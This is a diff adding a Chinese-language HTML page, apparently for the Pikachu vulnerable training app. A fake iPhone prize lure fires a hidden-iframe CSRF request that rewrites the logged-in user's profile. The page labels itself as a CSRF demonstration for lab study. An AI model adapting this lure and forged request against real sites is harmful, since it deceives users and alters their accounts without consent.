@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>钓鱼网站</title>
+    <meta charset="utf-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        h1 {
+            color: #333;
+        }
+        .hidden {
+            display: none;
+        }
+        .btn {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 10px 2px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        .info {
+            background-color: #f8f9fa;
+            border-left: 4px solid #5bc0de;
+            padding: 10px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>恭喜您抽中大奖！</h1>
+        <p>亲爱的用户，您已被随机抽中获得一台全新iPhone 15！</p>
+        <p>点击下方按钮领取您的奖品：</p>
+        
+        <button class="btn" onclick="claimPrize()">立即领取</button>
+        
+        <div class="info">
+            <p><strong>攻击说明：</strong>这是一个演示CSRF攻击的页面。当用户点击"立即领取"按钮时，会触发一个针对CSRF漏洞的攻击，自动修改用户在Pikachu系统中的个人信息。</p>
+        </div>
+        
+        <!-- 隐藏的iframe，用于执行CSRF攻击 -->
+        <iframe id="csrf-frame" class="hidden"></iframe>
+    </div>
+
+    <script>
+        function claimPrize() {
+            // 构造CSRF攻击URL - 修改用户信息
+            var csrfUrl = "http://localhost:8888/vul/csrf/csrfget/csrf_get_edit?sex=已被攻击&phonenum=13800138000&add=黑客总部&email=hacker@evil.com&submit=submit";
+            
+            // 通过iframe加载攻击URL
+            document.getElementById("csrf-frame").src = csrfUrl;
+            
+            // 显示成功信息
+            alert("恭喜！您的奖品即将发放。请留意系统消息。\n\n您的个人信息已被攻击者修改！这就是CSRF攻击的危害。");
+        }
+    </script>
+</body>
+</html> 
